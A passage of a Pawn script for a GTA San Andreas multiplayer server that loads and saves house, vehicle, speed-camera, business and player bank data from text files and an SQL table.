				if (strcmp(ParameterName, "HouseName", false) == 0) // If the parametername is correct ("HouseName")
				    format(AHouseData[HouseID][HouseName], 24, ParameterValue); // Store the HouseName
				if (strcmp(ParameterName, "HouseX", false) == 0) // If the parametername is correct ("HouseX")
					AHouseData[HouseID][HouseX] = floatstr(ParameterValue); // Store the HouseX
				if (strcmp(ParameterName, "HouseY", false) == 0) // If the parametername is correct ("HouseY")
					AHouseData[HouseID][HouseY] = floatstr(ParameterValue); // Store the HouseY
				if (strcmp(ParameterName, "HouseZ", false) == 0) // If the parametername is correct ("HouseZ")
					AHouseData[HouseID][HouseZ] = floatstr(ParameterValue); // Store the HouseZ
				if (strcmp(ParameterName, "HouseLevel", false) == 0) // If the parametername is correct ("HouseLevel")
					AHouseData[HouseID][HouseLevel] = strval(ParameterValue); // Store the HouseLevel
				if (strcmp(ParameterName, "HouseMaxLevel", false) == 0) // If the parametername is correct ("HouseMaxLevel")
					AHouseData[HouseID][HouseMaxLevel] = strval(ParameterValue); // Store the HouseMaxLevel
				if (strcmp(ParameterName, "HousePrice", false) == 0) // If the parametername is correct ("HousePrice")
					AHouseData[HouseID][HousePrice] = strval(ParameterValue); // Store the HousePrice
				if (strcmp(ParameterName, "Owned", false) == 0) // If the parametername is correct ("Owned")
				{
				    if (strcmp(ParameterValue, "Yes", false) == 0) // If the value "Yes" was read
						AHouseData[HouseID][Owned] = true; // House is owned
					else
						AHouseData[HouseID][Owned] = false; // House is not owned
				}
				if (strcmp(ParameterName, "Owner", false) == 0) // If the parametername is correct ("Owner")
					// Store the Owner (Owner will hold "1" if there is no owner (empty string), done by "sscanf" I guess)
					// But this doesn't matter, as the owner will never be displayed when the house is not owned by someone
				    format(AHouseData[HouseID][Owner], 24, ParameterValue);
				if (strcmp(ParameterName, "Insurance", false) == 0) // If the parametername is correct ("Insurance")
					AHouseData[HouseID][Insurance] = strval(ParameterValue); // Store the Insurance

				if (strcmp(ParameterName, "AutoEvictDays", false) == 0) // If the parametername is correct ("AutoEvictDays")
					AHouseData[HouseID][AutoEvictDays] = strval(ParameterValue); // Store the AutoEvictDays
					
			/*}
			else // OnlyLoadVehicles is "true", so only read the vehicle-data
			{*/
				if (strcmp(ParameterName, "[Vehicle]", false) == 0) // If the parametername is correct ("[Vehicle]")
				{
				    // Clear all data to start a new vehicle
				    cModel = 0;
				    cPaint = 0;
				    cFuel = -1;
				    Neons = 0;
				    for (new i; i < 14; i++)
				        components[i] = 0;
				}
				if (strcmp(ParameterName, "VehicleModel", false) == 0) // If the parametername is correct ("VehicleModel")
					cModel = strval(ParameterValue); // Store the VehicleModel
				if (strcmp(ParameterName, "Fuel", false) == 0) // If the parametername is correct ("Fuel")
					cFuel = strval(ParameterValue); // Store the Fuel
				if (strcmp(ParameterName, "VehiclePaintJob", false) == 0) // If the parametername is correct ("VehiclePaintJob")
					cPaint = strval(ParameterValue); // Store the VehiclePaintJob
				if (strcmp(ParameterName, "VehicleSpoiler", false) == 0) // If the parametername is correct ("VehicleSpoiler")
					components[0] = strval(ParameterValue); // Store the VehicleSpoiler
				if (strcmp(ParameterName, "VehicleHood", false) == 0) // If the parametername is correct ("VehicleHood")
					components[1] = strval(ParameterValue); // Store the VehicleHood
				if (strcmp(ParameterName, "VehicleRoof", false) == 0) // If the parametername is correct ("VehicleRoof")
					components[2] = strval(ParameterValue); // Store the VehicleRoof
				if (strcmp(ParameterName, "VehicleSideSkirt", false) == 0) // If the parametername is correct ("VehicleSideSkirt")
					components[3] = strval(ParameterValue); // Store the VehicleSideSkirt
				if (strcmp(ParameterName, "VehicleLamps", false) == 0) // If the parametername is correct ("VehicleLamps")
					components[4] = strval(ParameterValue); // Store the VehicleLamps
				if (strcmp(ParameterName, "VehicleNitro", false) == 0) // If the parametername is correct ("VehicleNitro")
					components[5] = strval(ParameterValue); // Store the VehicleNitro
				if (strcmp(ParameterName, "VehicleExhaust", false) == 0) // If the parametername is correct ("VehicleExhaust")
					components[6] = strval(ParameterValue); // Store the VehicleExhaust
				if (strcmp(ParameterName, "VehicleWheels", false) == 0) // If the parametername is correct ("VehicleWheels")
					components[7] = strval(ParameterValue); // Store the VehicleWheels
				if (strcmp(ParameterName, "VehicleStereo", false) == 0) // If the parametername is correct ("VehicleStereo")
					components[8] = strval(ParameterValue); // Store the VehicleStereo
				if (strcmp(ParameterName, "VehicleHydraulics", false) == 0) // If the parametername is correct ("VehicleHydraulics")
					components[9] = strval(ParameterValue); // Store the VehicleHydraulics
				if (strcmp(ParameterName, "VehicleFrontBumper", false) == 0) // If the parametername is correct ("VehicleFrontBumper")
					components[10] = strval(ParameterValue); // Store the VehicleFrontBumper
				if (strcmp(ParameterName, "VehicleRearBumper", false) == 0) // If the parametername is correct ("VehicleRearBumper")
					components[11] = strval(ParameterValue); // Store the VehicleRearBumper
				if (strcmp(ParameterName, "VehicleVentRight", false) == 0) // If the parametername is correct ("VehicleVentRight")
					components[12] = strval(ParameterValue); // Store the VehicleVentRight
				if (strcmp(ParameterName, "VehicleVentLeft", false) == 0) // If the parametername is correct ("VehicleVentLeft")
					components[13] = strval(ParameterValue); // Store the VehicleVentLeft

				if (strcmp(ParameterName, "Color1", false) == 0) // If the parametername is correct ("Color1")
					Col1 = strval(ParameterValue); // Store the Color1
				if (strcmp(ParameterName, "Color2", false) == 0) // If the parametername is correct ("Color2")
					Col2 = strval(ParameterValue); // Store the Color2

				if (strcmp(ParameterName, "VehicleX", false) == 0) // If the parametername is correct ("VehicleX")
					cx = floatstr(ParameterValue); // Store the VehicleX
				if (strcmp(ParameterName, "VehicleY", false) == 0) // If the parametername is correct ("VehicleY")
					cy = floatstr(ParameterValue); // Store the VehicleY
				if (strcmp(ParameterName, "VehicleZ", false) == 0) // If the parametername is correct ("VehicleZ")
					cz = floatstr(ParameterValue); // Store the VehicleZ
				if (strcmp(ParameterName, "VehicleAngle", false) == 0) // If the parametername is correct ("VehicleAngle")
					crot = floatstr(ParameterValue); // Store the VehicleAngle

				if (strcmp(ParameterName, "NeonsApplied", false) == 0) // If the parametername is correct ("NeonsApplied")
					Neons = strval(ParameterValue); // Store the NeonsApplied

				if (strcmp(ParameterName, "Clamped", false) == 0) // If the parametername is correct ("Clamped")
				{
				    if (strcmp(ParameterValue, "Yes", false) == 0) // If the value "Yes" was read
						VehicleClamped = true; // Vehicle is clamped
					else
						VehicleClamped = false; // Vehicle is not clamped
				}

				if (strcmp(ParameterName, "[/Vehicle]", false) == 0) // If the parametername is correct ("[/Vehicle]")
				{
					// Set both colors to 1 if they are 0 AND if there is a paintjob applied
					if ((Col1 == 0) && (cPaint != 0))
					    Col1 = 1;
					if ((Col2 == 0) && (cPaint != 0))
					    Col2 = 1;

					// The "[/Vehicle]" is found, this means that all data about this vehicle is now stored in the variables
					// Now add the vehicle to the house and set it's data
					vid = House_AddVehicle(HouseID, cModel, cPaint, components, cx, cy, cz, crot, Col1, Col2);
					AVehicleData[vid][Clamped] = VehicleClamped;
					// Apply the neons if they have been loaded
					if (Neons != 0)
					{
						AVehicleData[vid][NeonObjectModel] = Neons;
					    AVehicleData[vid][NeonLeft] = CreateObject(AVehicleData[vid][NeonObjectModel],0,0,0,0,0,0);
					    AVehicleData[vid][NeonRight] = CreateObject(AVehicleData[vid][NeonObjectModel],0,0,0,0,0,0);
						AttachObjectToVehicle(AVehicleData[vid][NeonLeft], vid, -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
						AttachObjectToVehicle(AVehicleData[vid][NeonRight], vid, 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
					}

					// Also set the fuel (set it to maximum when the fuel parameter wasn't inside the file)
					if (cFuel == -1)
						AVehicleData[vid][Fuel] = MaxFuel;
					else // If the parameter was there, store it
						AVehicleData[vid][Fuel] = cFuel;

					AracSayisi++;
					if(AracSayisi == AHouseData[HouseID][HouseLevel]) break;
				}
			/*}*/

            // Read the next line of the file
			fread(HFile, LineFromFile);
		}

				
				
				
		// Check if the maximum house-level isn't 0 (when updating to the new version)
		if (AHouseData[HouseID][HouseMaxLevel] == 0)
		    AHouseData[HouseID][HouseMaxLevel] = 11; // Set the maximum level to 10

        // Close the file
		fclose(HFile);

        // Return if the file was read correctly
		return 1;
	}
	else
	    return 0; // Return 0 if the file couldn't be read (doesn't exist)
}

// This function will save the given house
HouseFile_Save(HouseID)
{
	new file[100], File:HFile, LineForFile[100], vid;

    // Construct the complete filename for this house
	format(file, sizeof(file), HouseFile, HouseID);

	HFile = fopen(file, io_write); // Open the playerfile for writing

	format(LineForFile, 100, "HouseName %s\r\n", AHouseData[HouseID][HouseName]); // Construct the line: "HouseName <HouseName>"
	fwrite(HFile, LineForFile); // And save it to the file

	format(LineForFile, 100, "HouseX %f\r\n", AHouseData[HouseID][HouseX]); // Construct the line: "HouseX <HouseX>"
	fwrite(HFile, LineForFile); // And save it to the file

	format(LineForFile, 100, "HouseY %f\r\n", AHouseData[HouseID][HouseY]); // Construct the line: "HouseY <HouseY>"
	fwrite(HFile, LineForFile); // And save it to the file

	format(LineForFile, 100, "HouseZ %f\r\n", AHouseData[HouseID][HouseZ]); // Construct the line: "HouseZ <HouseZ>"
	fwrite(HFile, LineForFile); // And save it to the file

	format(LineForFile, 100, "HouseLevel %i\r\n", AHouseData[HouseID][HouseLevel]); // Construct the line: "HouseLevel <HouseLevel>"
	fwrite(HFile, LineForFile); // And save it to the file

	format(LineForFile, 100, "HouseMaxLevel %i\r\n", AHouseData[HouseID][HouseMaxLevel]); // Construct the line: "HouseMaxLevel <HouseMaxLevel>"
	fwrite(HFile, LineForFile); // And save it to the file

	format(LineForFile, 100, "HousePrice %i\r\n", AHouseData[HouseID][HousePrice]); // Construct the line: "HousePrice <HousePrice>"
	fwrite(HFile, LineForFile); // And save it to the file

	if (AHouseData[HouseID][Owned] == true) // Check if the house is owned
	{
		format(LineForFile, 100, "Owned Yes\r\n"); // Construct the line: "Owned Yes"
		fwrite(HFile, LineForFile); // And save it to the file
	}
	else
	{
		format(LineForFile, 100, "Owned No\r\n"); // Construct the line: "Owned No"
		fwrite(HFile, LineForFile); // And save it to the file
	}

	format(LineForFile, 100, "Owner %s\r\n", AHouseData[HouseID][Owner]); // Construct the line: "Owner <Owner>"
	fwrite(HFile, LineForFile); // And save it to the file

	format(LineForFile, 100, "Insurance %i\r\n", AHouseData[HouseID][Insurance]); // Construct the line: "Insurance <Insurance>"
	fwrite(HFile, LineForFile); // And save it to the file

	AHouseData[HouseID][AutoEvictDays] = AutoEvict[AEDays]; // Update the AutoEvictDays for this house when the player logs out
	format(LineForFile, 100, "AutoEvictDays %i\r\n", AutoEvict[AEDays]); // Construct the line: "AutoEvictDays <AutoEvictDays>"
	fwrite(HFile, LineForFile); // And save it to the file



	// Save the vehicle-data for every vehicle added to the house
	for (new CarSlot; CarSlot < 11; CarSlot++)
	{
	    // If a valid vehicle-id has been found
		if (AHouseData[HouseID][VehicleIDs][CarSlot] != 0)
		{
			// Get the vehicle id
			vid = AHouseData[HouseID][VehicleIDs][CarSlot];

		    format(LineForFile, 100, "[Vehicle]\r\n"); // Construct the line: "[Vehicle]"
			fwrite(HFile, LineForFile); // And save it to the file

		    format(LineForFile, 100, "VehicleModel %i\r\n", AVehicleData[vid][Model]); // Construct the line: "VehicleModel <VehicleModel>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "Fuel %i\r\n", AVehicleData[vid][Fuel]); // Construct the line: "Fuel <Fuel>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "VehiclePaintJob %i\r\n", AVehicleData[vid][PaintJob]); // Construct the line: "VehiclePaintJob <VehiclePaintJob>"
			fwrite(HFile, LineForFile); // And save it to the file

		    format(LineForFile, 100, "VehicleSpoiler %i\r\n", AVehicleData[vid][Components][0]); // Construct the line: "VehicleSpoiler <VehicleSpoiler>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "VehicleHood %i\r\n", AVehicleData[vid][Components][1]); // Construct the line: "VehicleHood <VehicleHood>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "VehicleRoof %i\r\n", AVehicleData[vid][Components][2]); // Construct the line: "VehicleRoof <VehicleRoof>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "VehicleSideSkirt %i\r\n", AVehicleData[vid][Components][3]); // Construct the line: "VehicleSideSkirt <VehicleSideSkirt>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "VehicleLamps %i\r\n", AVehicleData[vid][Components][4]); // Construct the line: "VehicleLamps <VehicleLamps>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "VehicleNitro %i\r\n", AVehicleData[vid][Components][5]); // Construct the line: "VehicleNitro <VehicleNitro>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "VehicleExhaust %i\r\n", AVehicleData[vid][Components][6]); // Construct the line: "VehicleSpoiler <VehicleSpoiler>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "VehicleWheels %i\r\n", AVehicleData[vid][Components][7]); // Construct the line: "VehicleWheels <VehicleWheels>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "VehicleStereo %i\r\n", AVehicleData[vid][Components][8]); // Construct the line: "VehicleStereo <VehicleStereo>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "VehicleHydraulics %i\r\n", AVehicleData[vid][Components][9]); // Construct the line: "VehicleHydraulics <VehicleHydraulics>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "VehicleFrontBumper %i\r\n", AVehicleData[vid][Components][10]); // Construct the line: "VehicleFrontBumper <VehicleFrontBumper>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "VehicleRearBumper %i\r\n", AVehicleData[vid][Components][11]); // Construct the line: "VehicleRearBumper <VehicleRearBumper>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "VehicleVentRight %i\r\n", AVehicleData[vid][Components][12]); // Construct the line: "VehicleVentRight <VehicleVentRight>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "VehicleVentLeft %i\r\n", AVehicleData[vid][Components][13]); // Construct the line: "VehicleVentLeft <VehicleVentLeft>"
			fwrite(HFile, LineForFile); // And save it to the file

		    format(LineForFile, 100, "Color1 %i\r\n", AVehicleData[vid][Color1]); // Construct the line: "Color1 <Color1>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "Color2 %i\r\n", AVehicleData[vid][Color2]); // Construct the line: "Color2 <Color2>"
			fwrite(HFile, LineForFile); // And save it to the file

		    format(LineForFile, 100, "VehicleX %f\r\n", AVehicleData[vid][SpawnX]); // Construct the line: "VehicleVentLeft <VehicleVentLeft>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "VehicleY %f\r\n", AVehicleData[vid][SpawnY]); // Construct the line: "VehicleVentLeft <VehicleVentLeft>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "VehicleZ %f\r\n", AVehicleData[vid][SpawnZ]); // Construct the line: "VehicleVentLeft <VehicleVentLeft>"
			fwrite(HFile, LineForFile); // And save it to the file
		    format(LineForFile, 100, "VehicleAngle %f\r\n", AVehicleData[vid][SpawnRot]); // Construct the line: "VehicleVentLeft <VehicleVentLeft>"
			fwrite(HFile, LineForFile); // And save it to the file

		    format(LineForFile, 100, "NeonsApplied %i\r\n", AVehicleData[vid][NeonObjectModel]); // Construct the line: "NeonsApplied <NeonsApplied>"
			fwrite(HFile, LineForFile); // And save it to the file

			if (AVehicleData[vid][Clamped] == true)
			    format(LineForFile, 100, "Clamped Yes\r\n"); // Construct the line: "Clamped <Yes>"
			else
			    format(LineForFile, 100, "Clamped No\r\n"); // Construct the line: "Clamped <No>"

			fwrite(HFile, LineForFile); // And save it to the file

		    format(LineForFile, 100, "[/Vehicle]\r\n"); // Construct the line: "[/Vehicle]"
			fwrite(HFile, LineForFile); // And save it to the file
		}
	}

	fclose(HFile); // Close the file

	return 1;
}



// This function loads all speedcameras
Camera_LoadAll()
{
	// Loop through all cameras and try to load them
	for (new CamID; CamID < MAX_CAMERAS; CamID++)
	{
	    // Try to load the file and check if it was succesfully loaded (file exists)
		if (CameraFile_Load(CamID) == 1)
		{
			// Save the number of camera's that have been loaded, so it can be displayed
		    TotalCameras++;
		}
	}

	return 1;
}



// This function will load the speedcamera's datafile (used when the server is started to load all cameras)
CameraFile_Load(CamID)
{
	// Setup local variables
	new file[100], File:CFile, LineFromFile[100], ParameterName[50], ParameterValue[50];
	new Float:x, Float:y, Float:z, Float:rot, MaxSpeed;

	format(file, sizeof(file), CameraFile, CamID); // Construct the complete filename for this camera-file

	if (fexist(file))
	{
		CFile = fopen(file, io_read); // Open the camerafile for reading

		fread(CFile, LineFromFile); // Read the first line of the file

		// Keep reading until the end of the file is found (no more data)
		while (strlen(LineFromFile) > 0)
		{
			StripNewLine(LineFromFile); // Strip any newline characters from the LineFromFile
			sscanf(LineFromFile, "s[50]s[50]", ParameterName, ParameterValue); // Extract parametername and parametervalue

			// Store the proper value in the proper place
			if (strcmp(ParameterName, "CamX", false) == 0) // If the parametername is correct ("CamX")
			    x = floatstr(ParameterValue); // Store the CamX
			if (strcmp(ParameterName, "CamY", false) == 0) // If the parametername is correct ("CamY")
			    y = floatstr(ParameterValue); // Store the CamY
			if (strcmp(ParameterName, "CamZ", false) == 0) // If the parametername is correct ("CamZ")
			    z = floatstr(ParameterValue); // Store the CamZ
			if (strcmp(ParameterName, "CamAngle", false) == 0) // If the parametername is correct ("CamAngle")
			    rot = floatstr(ParameterValue); // Store the CamAngle
			if (strcmp(ParameterName, "CamSpeed", false) == 0) // If the parametername is correct ("CamSpeed")
			    MaxSpeed = strval(ParameterValue); // Store the CamSpeed

			fread(CFile, LineFromFile); // Read the next line of the file
		}

		fclose(CFile); // Close the file

		// All data has been read about the camera, now setup the camera
		SetupSpeedCamera(CamID, x, y, z, rot, MaxSpeed);

		return 1; // Return that the file was read correctly
	}
	else
	    return 0; // Return 0 if the file couldn't be read (doesn't exist)
}



// This function loads all businesses

Business_LoadAll()
{
	new Msg[500], bID, bName[100], bSahip[40], Sahipli, bLevel, BusType, Icon, Float:x, Float:y, Float:z;
	if(SQL::TableExists("isyerleri"))
	{
		new handle = SQL::Open(SQL::MTREAD, "isyerleri");
		SQL::ReadRetrievedRows(handle, i)
		{
            SQL::ReadInt(handle, "ID", bID, i);

    		SQL::ReadFloat(handle, "X", ABusinessData[bID][BusinessX], i);
    		SQL::ReadFloat(handle, "Y", ABusinessData[bID][BusinessY], i);
    		SQL::ReadFloat(handle, "Z", ABusinessData[bID][BusinessZ], i);
    		SQL::ReadInt(handle, "Type", ABusinessData[bID][BusinessType], i);
    		SQL::ReadString(handle, "Isim", bName, 100, i);
    		SQL::ReadString(handle, "Sahip", bSahip, 540, i);
            SQL::ReadInt(handle, "Sahipli", Sahipli, i);
            SQL::ReadInt(handle, "Level", bLevel, i);
            
			BusType = ABusinessData[bID][BusinessType];
			Icon = ABusinessInteriors[BusType][IconID];

			x = ABusinessData[bID][BusinessX];
			y = ABusinessData[bID][BusinessY];
			z = ABusinessData[bID][BusinessZ];
			
			ABusinessData[bID][PickupID] = CreateDynamicPickup(1274, 1, x, y, z, 0);
			ABusinessData[bID][MapIconID] = CreateDynamicMapIcon(x, y, z, Icon, 0, 0, 0, -1, 150.0);

			if(Sahipli == 1)
			{
				format(Msg, 500, TXT_PickupBusinessOwned, bName, bID, bSahip, bLevel);
				ABusinessData[bID][DoorText] = CreateDynamic3DTextLabel(Msg, 0x008080FF, x, y, z + 1.0, 50.0);
			}else{
				format(Msg, 500, TXT_PickupBusinessForSale, ABusinessInteriors[BusType][InteriorName], bID, ABusinessInteriors[BusType][BusPrice], ABusinessInteriors[BusType][BusEarnings]);
				ABusinessData[bID][DoorText] = CreateDynamic3DTextLabel(Msg, 0x008080FF, x, y, z + 1.0, 50.0);
			}
		}
		SQL::Close(handle);
	}
/* BURA SÝLÝNECEK
	new query[1024], Msg[500], bID, bName[100], bSahip[40], BusType, Icon, Float:x, Float:y, Float:z, Cache: get_isyeri;
	mysql_format(Connection, query, sizeof(query), "SELECT * FROM `isyerleri` ORDER BY `ID` LIMIT 5000");
	get_isyeri = mysql_query(Connection, query);
	new rows = cache_num_rows();

	if(rows)
	{
		for(new i; i < rows; ++i)
 		{
 		    bID = cache_get_field_content_int(i, "ID");
 		     = cache_get_field_content_float(i, "X");
 		    ABusinessData[bID][BusinessY] = cache_get_field_content_float(i, "Y");
 		    ABusinessData[bID][BusinessZ] = cache_get_field_content_float(i, "Z");
 		     = cache_get_field_content_int(i, "Type");

			cache_get_field_content(i, "Isim", );
			cache_get_field_content(i, "Sahip", bSahip);


   		}
	}
	cache_delete(get_isyeri);
*/
	return 1;
}

// This function loads the file that holds the current business-time

/*BusinessTime_Load()
{
	// Setup local variables
	new File:BFile, LineFromFile[100], ParameterName[50], ParameterValue[50];

	// Try to load the businesstime file
	if (fexist("ServerData/Business/BusinessTime.ini"))
	{
		BFile = fopen("ServerData/Business/BusinessTime.ini", io_read); // Open the businesstime-file for reading

		fread(BFile, LineFromFile); // Read the first line of the file

		// Keep reading until the end of the file is found (no more data)
		while (strlen(LineFromFile) > 0)
		{
			StripNewLine(LineFromFile); // Strip any newline characters from the LineFromFile
			sscanf(LineFromFile, "s[50]s[50]", ParameterName, ParameterValue); // Extract parametername and parametervalue

			// Store the proper value in the proper place
			if (strcmp(ParameterName, "BusinessTime", false) == 0) // If the parametername is correct ("BusinessTime")
				BusinessTransactionTime = strval(ParameterValue); // Store the BusinessTime

            // Read the next line of the file
			fread(BFile, LineFromFile);
		}

        // Close the file
		fclose(BFile);

        // Return if the file was read correctly
		return 1;
	}
	else
	    return 0; // Return 0 if the file couldn't be read (doesn't exist)
}*/

// This function saves the file that holds the current business-time
/*BusinessTime_Save()
{
	new File:BFile, LineForFile[100];

	BFile = fopen("ServerData/Business/BusinessTime.ini", io_write); // Open the businesstime-file for writing

	format(LineForFile, 100, "BusinessTime %i\r\n", BusinessTransactionTime); // Construct the line: "BusinessTime <BusinessTransactionTime>"
	fwrite(BFile, LineForFile); // And save it to the file

	fclose(BFile); // Close the file

	return 1;
}*/


// This function will load the business's datafile (used when the server is started to load all businesses)
/*BusinessFile_Load(BusID)
{
	// Setup local variables
	new file[100], File:BFile, LineFromFile[100], ParameterName[50], ParameterValue[50];

	format(file, sizeof(file), BusinessFile, BusID); // Construct the complete filename for this business-file

	if (fexist(file))
	{
		BFile = fopen(file, io_read); // Open the housefile for reading

		fread(BFile, LineFromFile); // Read the first line of the file

		// Keep reading until the end of the file is found (no more data)
		while (strlen(LineFromFile) > 0)
		{
			StripNewLine(LineFromFile); // Strip any newline characters from the LineFromFile
			sscanf(LineFromFile, "s[50]s[50]", ParameterName, ParameterValue); // Extract parametername and parametervalue

			// Store the proper value in the proper place
			if (strcmp(ParameterName, "BusinessName", false) == 0) // If the parametername is correct ("BusinessName")
			    format(ABusinessData[BusID][BusinessName], 24, ParameterValue); // Store the BusinessName
			if (strcmp(ParameterName, "BusinessX", false) == 0) // If the parametername is correct ("BusinessX")
				ABusinessData[BusID][BusinessX] = floatstr(ParameterValue); // Store the BusinessX
			if (strcmp(ParameterName, "BusinessY", false) == 0) // If the parametername is correct ("BusinessY")
				ABusinessData[BusID][BusinessY] = floatstr(ParameterValue); // Store the BusinessY
			if (strcmp(ParameterName, "BusinessZ", false) == 0) // If the parametername is correct ("BusinessZ")
				ABusinessData[BusID][BusinessZ] = floatstr(ParameterValue); // Store the BusinessZ
			if (strcmp(ParameterName, "BusinessType", false) == 0) // If the parametername is correct ("BusinessType")
				ABusinessData[BusID][BusinessType] = strval(ParameterValue); // Store the BusinessType
			if (strcmp(ParameterName, "BusinessLevel", false) == 0) // If the parametername is correct ("BusinessLevel")
				ABusinessData[BusID][BusinessLevel] = strval(ParameterValue); // Store the BusinessLevel
			if (strcmp(ParameterName, "LastTransaction", false) == 0) // If the parametername is correct ("LastTransaction")
				ABusinessData[BusID][LastTransaction] = strval(ParameterValue); // Store the LastTransaction
			if (strcmp(ParameterName, "Owned", false) == 0) // If the parametername is correct ("Owned")
			{
			    if (strcmp(ParameterValue, "Yes", false) == 0) // If the value "Yes" was read
					ABusinessData[BusID][Owned] = true; // House is owned
				else
					ABusinessData[BusID][Owned] = false; // House is not owned
			}
			if (strcmp(ParameterName, "Owner", false) == 0) // If the parametername is correct ("Owner")
			    format(ABusinessData[BusID][Owner], 24, ParameterValue);

			if (strcmp(ParameterName, "AutoEvictDays", false) == 0) // If the parametername is correct ("AutoEvictDays")
				ABusinessData[BusID][AutoEvictDays] = strval(ParameterValue); // Store the AutoEvictDays

            // Read the next line of the file
			fread(BFile, LineFromFile);
		}

        // Close the file
		fclose(BFile);

        // Return if the file was read correctly
		return 1;
	}
	else
	    return 0; // Return 0 if the file couldn't be read (doesn't exist)
}

// This function will save the given business
BusinessFile_Save(BusID)
{
	new file[100], File:BFile, LineForFile[100];

    // Construct the complete filename for this business
	format(file, sizeof(file), BusinessFile, BusID);

	BFile = fopen(file, io_write); // Open the business-file for writing

	format(LineForFile, 100, "BusinessName %s\r\n", ABusinessData[BusID][BusinessName]); // Construct the line: "BusinessName <BusinessName>"
	fwrite(BFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "BusinessX %f\r\n", ABusinessData[BusID][BusinessX]); // Construct the line: "BusinessX <BusinessX>"
	fwrite(BFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "BusinessY %f\r\n", ABusinessData[BusID][BusinessY]); // Construct the line: "BusinessY <BusinessY>"
	fwrite(BFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "BusinessZ %f\r\n", ABusinessData[BusID][BusinessZ]); // Construct the line: "BusinessZ <BusinessZ>"
	fwrite(BFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "BusinessType %i\r\n", ABusinessData[BusID][BusinessType]); // Construct the line: "BusinessType <BusinessType>"
	fwrite(BFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "BusinessLevel %i\r\n", ABusinessData[BusID][BusinessLevel]); // Construct the line: "BusinessLevel <BusinessLevel>"
	fwrite(BFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "LastTransaction %i\r\n", ABusinessData[BusID][LastTransaction]); // Construct the line: "LastTransaction <LastTransaction>"
	fwrite(BFile, LineForFile); // And save it to the file

	ABusinessData[BusID][AutoEvictDays] = AutoEvict[AEDays]; // Update the AutoEvictDays for this business when the player logs out
	format(LineForFile, 100, "AutoEvictDays %i\r\n", AutoEvict[AEDays]); // Construct the line: "AutoEvictDays <AutoEvictDays>"
	fwrite(BFile, LineForFile); // And save it to the file

	if (ABusinessData[BusID][Owned] == true) // Check if the house is owned
	{
		format(LineForFile, 100, "Owned Yes\r\n"); // Construct the line: "Owned Yes"
		fwrite(BFile, LineForFile); // And save it to the file
	}
	else
	{
		format(LineForFile, 100, "Owned No\r\n"); // Construct the line: "Owned No"
		fwrite(BFile, LineForFile); // And save it to the file
	}

	format(LineForFile, 100, "Owner %s\r\n", ABusinessData[BusID][Owner]); // Construct the line: "Owner <Owner>"
	fwrite(BFile, LineForFile); // And save it to the file

	fclose(BFile); // Close the file

	return 1;
}
*/

// This function will load the player's bank account and process transfers that were made to his account when he was offline
BankFile_Load(playerid)
{
	// Setup local variables
	new file[100], File:BFile, Name[24], LineFromFile[100], ParameterName[50], ParameterValue[50];
	new TransferMoney, TransferName[24], TransferTime[24], Msg[128];
	//new IntrestAmount, OldBankMoney, NewBankMoney;

	format(Name, sizeof(Name), APlayerData[playerid][PlayerName]); // Get the playername
	format(file, sizeof(file), BankFile, Name); // Construct the complete filename for this player's bank-account

	if (fexist(file))
	{
		BFile = fopen(file, io_read); // Open the bankfile for reading

		fread(BFile, LineFromFile); // Read the first line of the file

		// Keep reading until the end of the file is found (no more data)
		while (strlen(LineFromFile) > 0)
		{
			StripNewLine(LineFromFile); // Strip any newline characters from the LineFromFile
			sscanf(LineFromFile, "s[50]s[50]", ParameterName, ParameterValue); // Extract parametername and parametervalue

			// Store the proper value in the proper place
			if (strcmp(ParameterName, "Money", false) == 0) // If the parametername is correct ("Money")
			{
		 		if(APlayerData[playerid][PlayerMoney] + strval(ParameterValue) < 999999999)
		 		{
					APlayerData[playerid][PlayerMoney] += strval(ParameterValue); // Store the Money
				}else{
				    APlayerData[playerid][PlayerMoney] = 999999999;
				}
			}
			// Process transfer-data
			if (strcmp(ParameterName, "[Transfer]", false) == 0) // If the parametername is correct ("[Transfer]")
			{
				TransferMoney = 0; // Clear the money variable
			    for (new i; i < sizeof(TransferName); i++) // Clear the name variable
			        TransferName[i] = 0;
			    for (new i; i < sizeof(TransferTime); i++) // Clear the time variable
			        TransferTime[i] = 0;
			}
			if (strcmp(ParameterName, "TransferMoney", false) == 0) // If the parametername is correct ("TransferMoney")
			{
				TransferMoney = strval(ParameterValue); // Store the TransferMoney
		 		if(APlayerData[playerid][PlayerMoney] + strval(ParameterValue) < 999999999)
		 		{
					APlayerData[playerid][PlayerMoney] += strval(ParameterValue); // Store the Money
				}else{
				    APlayerData[playerid][PlayerMoney] = 999999999;
				}
			}
			if (strcmp(ParameterName, "TransferName", false) == 0) // If the parametername is correct ("TransferName")
			    format(TransferName, sizeof(TransferName), ParameterValue); // Store the TransferName
			if (strcmp(ParameterName, "TransferTime", false) == 0) // If the parametername is correct ("TransferTime")
			    format(TransferTime, sizeof(TransferTime), ParameterValue); // Store the TransferTime
